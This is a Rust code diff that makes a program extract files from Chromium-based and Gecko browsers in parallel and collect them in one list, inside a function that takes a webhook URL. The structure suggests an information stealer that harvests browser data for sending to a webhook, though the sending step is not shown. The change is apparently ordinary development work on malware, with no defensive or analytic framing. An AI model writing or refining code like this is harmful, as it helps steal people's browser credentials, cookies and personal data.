@@ -9,13 +9,13 @@ mod zip_layout;
 pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
     let mut all_files: Vec<(String, String)> = Vec::new();
 
-    crate::log::log("chromium extract...");
+    crate::log::log("chromium + gecko extract (parallel)...");
+    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
     let chromium_files = chromium::extract_all();
+    let gecko_files = gecko_handle.join().unwrap_or_default();
+
     crate::log::log(&format!("chromium: {} file(s)", chromium_files.len()));
     all_files.extend(chromium_files);
-
-    crate::log::log("gecko extract...");
-    let gecko_files = gecko::extract_all();
     crate::log::log(&format!("gecko: {} file(s)", gecko_files.len()));
     all_files.extend(gecko_files);
 
